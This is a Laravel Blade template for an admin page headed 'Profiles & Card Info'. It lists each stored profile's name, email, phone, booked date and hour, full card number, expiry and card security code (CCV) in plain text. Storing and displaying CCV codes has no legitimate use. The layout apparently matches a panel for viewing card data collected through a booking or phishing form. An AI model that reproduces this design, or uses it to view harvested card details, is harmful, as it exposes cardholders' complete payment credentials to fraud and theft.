<head>    
<link rel="icon" href="{{ Url('assets/favicon.svg') }}" />
</head>

<div style="max-width: 1000px; margin: 40px auto; font-family: Arial, sans-serif;">
    <h2 style="font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #333;">Profiles & Card Info</h2>

    <table style="width: 100%; border-collapse: collapse; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">
        <thead style="background-color: #f4f4f4;">
            <tr>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">#</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Name</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Email</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Phone</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Date</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Hour</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Card Number</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Expiry</th>
                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">CCV</th>
            </tr>
        </thead>
        <tbody>
            @foreach ($profiles as $index => $profile)
                <tr style="background-color: {{ $index % 2 == 0 ? '#fff' : '#f9f9f9' }};">
                    <td style="padding: 10px; border: 1px solid #ddd;">{{ $index + 1 }}</td>
                    <td style="padding: 10px; border: 1px solid #ddd;">{{ $profile->name }}</td>
                    <td style="padding: 10px; border: 1px solid #ddd;">{{ $profile->email }}</td>
                    <td style="padding: 10px; border: 1px solid #ddd;">{{ $profile->phone }}</td>
                    <td style="padding: 10px; border: 1px solid #ddd;">{{ $profile->selected_date }}</td>
                    <td style="padding: 10px; border: 1px solid #ddd;">{{ $profile->selected_hour }}</td>
                    <td style="padding: 10px; border: 1px solid #ddd;">
                        @if ($profile->card_number)
                            {{ $profile->card_number }}
                        @else
                            <span style="color: red; font-style: italic;">No Card</span>
                        @endif
                    </td>
                    <td style="padding: 10px; border: 1px solid #ddd;">
                        @if ($profile->month)
                            {{ ucfirst($profile->month) . '/' . $profile->year }}
                        @else
                            <span style="color: red; font-style: italic;">No Expiry</span>
                        @endif
                    </td>
                    <td style="padding: 10px; border: 1px solid #ddd;">
                        {{ $profile->ccv ?? '—' }}
                    </td>
                </tr>
            @endforeach
        </tbody>
    </table>
</div>
